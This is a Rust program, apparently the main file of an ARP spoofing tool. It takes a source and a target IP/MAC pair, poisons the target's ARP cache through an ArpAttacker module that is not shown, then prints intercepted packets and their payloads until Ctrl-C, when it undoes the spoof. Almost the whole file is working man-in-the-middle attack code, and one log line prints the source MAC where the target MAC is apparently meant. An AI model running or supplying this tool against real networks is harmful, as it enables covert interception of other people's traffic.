mod arp;

use anyhow::{anyhow, Result};
use clap::Parser;
use pnet::{datalink::interfaces, packet::Packet, util::MacAddr};
use std::{
    io,
    net::Ipv4Addr,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
};

use crate::arp::ArpAttacker;

#[derive(Parser, Debug, Copy, Clone)]
pub struct Args {
    #[clap(value_name = "source ipv4")]
    pub sip: Ipv4Addr,
    #[clap(value_name = "source mac")]
    pub smac: MacAddr,
    #[clap(value_name = "target ipv4")]
    pub tip: Ipv4Addr,
    #[clap(value_name = "target mac")]
    pub tmac: MacAddr,
}

fn main() -> Result<()> {
    let args = Args::parse();
    let ctrlc = Arc::new(AtomicBool::new(false));
    let ctrlcclone = ctrlc.clone();
    ctrlc::set_handler(move || {
        ctrlcclone.store(true, Ordering::Relaxed);
        println!("ctrl-c received, exiting...");
    })?;

    let interfaces = interfaces();
    let iface = interfaces
        .iter()
        .find(|iface| iface.is_up() && !iface.is_loopback())
        .ok_or(anyhow!("failed to find network interface"))?;
    println!("using interface: {}", iface.name);
    let mut client = ArpAttacker::new(iface)?;
    print!(
        "spoofing as {} ({}) to {} ({})...",
        args.sip, args.smac, args.tip, args.smac
    );
    client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
    println!(" done.");
    while !ctrlc.load(Ordering::Relaxed) {
        println!("receiving...");
        let data = match client.recv() {
            Ok(data) => data,
            Err(e) => {
                // ignore interrupted errors (ctrl-c)
                if let Some(e) = e.downcast_ref::<std::io::Error>() {
                    if e.kind() == io::ErrorKind::Interrupted {
                        continue;
                    }
                    println!("in io error, {e:#?}");
                };
                println!("failed to receive packet: {}", e);
                continue;
            }
        };
        println!(
            "received packet: {:?}. payload: {:500?}",
            data,
            data.payload()
        );
    }
    print!("unspoofing...");
    client.unspoof((args.sip, args.smac), (args.tip, args.tmac))?;
    println!(" done.");
    Ok(())
}
